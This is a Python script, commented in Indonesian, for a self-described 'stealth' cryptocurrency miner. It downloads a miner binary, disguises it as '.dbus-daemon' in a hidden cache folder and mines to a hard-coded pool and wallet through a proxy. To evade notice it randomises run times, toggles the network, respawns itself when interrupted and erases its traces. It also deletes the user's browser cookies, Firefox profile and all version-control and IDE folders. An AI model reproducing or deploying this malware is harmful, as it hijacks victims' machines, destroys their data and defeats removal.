#!/usr/bin/env python3
import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, socket

# === KONFIGURASI ===
MINER_URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://164.92.145.122:80"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

# Durasi acak dan cooldown
MIN_DURATION = 300
MAX_DURATION = 600
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

# === FUNGSI TAMBAHAN ===

def configure_socks5_proxy():
    proxy = os.getenv("SOCKS5_PROXY", "socks5h://110.236.150.88:80")
    os.environ["ALL_PROXY"] = proxy
    os.environ["HTTPS_PROXY"] = proxy
    os.environ["HTTP_PROXY"] = proxy
    print(f"[🧩] SOCKS5 proxy aktif: {proxy}")

def fake_http_headers():
    headers = [
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Referer: https://google.com/",
        "Connection: keep-alive",
        "X-Forwarded-For: 127.0.0.1"
    ]
    os.environ["FAKE_HEADERS"] = "|".join(headers)

def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

def firewall_bypass():
    try:
        subprocess.call(["ping", "-c", "1", "8.8.8.8"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("1.1.1.1", 443))
        s.close()
    except:
        pass

def is_cpu_100():
    try:
        return os.getloadavg()[0] >= os.cpu_count()
    except:
        return False

def disconnect_network():
    print("[🔌] Memutus koneksi...")
    try:
        subprocess.call(["nmcli", "networking", "off"])
        subprocess.call(["nmcli", "radio", "wifi", "off"])
    except:
        try:
            subprocess.call(["ifconfig", "eth0", "down"])
        except:
            pass

def reconnect_network():
    print("[🌐] Menghubungkan ulang jaringan...")
    try:
        subprocess.call(["nmcli", "networking", "on"])
        subprocess.call(["nmcli", "radio", "wifi", "on"])
    except:
        try:
            subprocess.call(["ifconfig", "eth0", "up"])
        except:
            pass

def clean_cookies():
    for path in [
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox",
        "~/.config/chromium/Default/Cookies"
    ]:
        full = os.path.expanduser(path)
        if os.path.exists(full):
            try:
                if os.path.isdir(full):
                    shutil.rmtree(full)
                else:
                    os.remove(full)
            except:
                pass

def clean_source_control():
    for base in ["~", "~/.local/share", "~/Downloads"]:
        for root, dirs, _ in os.walk(os.path.expanduser(base)):
            for d in [".git", ".svn", ".idea", ".vscode", "__pycache__"]:
                path = os.path.join(root, d)
                if os.path.exists(path):
                    try: shutil.rmtree(path)
                    except: pass

def clean_miner_cache():
    try:
        if os.path.exists(TARFILE): os.remove(TARFILE)
        if os.path.exists(HIDDEN_DIR): shutil.rmtree(HIDDEN_DIR)
    except: pass

def clean_mining_artifacts():
    for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
        for root, _, files in os.walk(os.path.expanduser(base)):
            for f in files:
                if any(k in f.lower() for k in ["miner", "cpuminer", "power2b"]):
                    try: os.remove(os.path.join(root, f))
                    except: pass

def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(MINER_URL, TARFILE)
    with tarfile.open(TARFILE) as tar:
        tar.extractall()
    path_bin = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, path_bin)
    os.chmod(path_bin, 0o755)
    if os.path.exists(TARFILE): os.remove(TARFILE)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[⛏️] Menambang selama {duration} detik...")
    proc = subprocess.Popen([
        path_bin, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100():
            print(f"[⚠️] CPU penuh! Cooldown {COOLDOWN_DURATION}s dan restart...")
            proc.terminate()
            disconnect_network()
            time.sleep(COOLDOWN_DURATION)
            restart_script()
            return
    proc.terminate()

def restart_script():
    print("[🔁] Restart ulang script...")
    clean_miner_cache()
    clean_mining_artifacts()
    reconnect_network()
    subprocess.Popen([sys.executable] + sys.argv)
    sys.exit(0)

def main_loop():
    while True:
        clean_mining_artifacts()
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[🛌] Istirahat {pause} detik...\n")
        time.sleep(pause)

# === MAIN ===
if __name__ == "__main__":
    print("🚀 Stealth Miner Aktif...")
    configure_socks5_proxy()
    fake_http_headers()
    clean_cookies()
    clean_source_control()

    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=firewall_bypass, daemon=True).start()

    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[⛔] Dihentikan oleh user.")
        restart_script()
    except Exception as e:
        print(f"[❌] Error: {e}")
        restart_script()
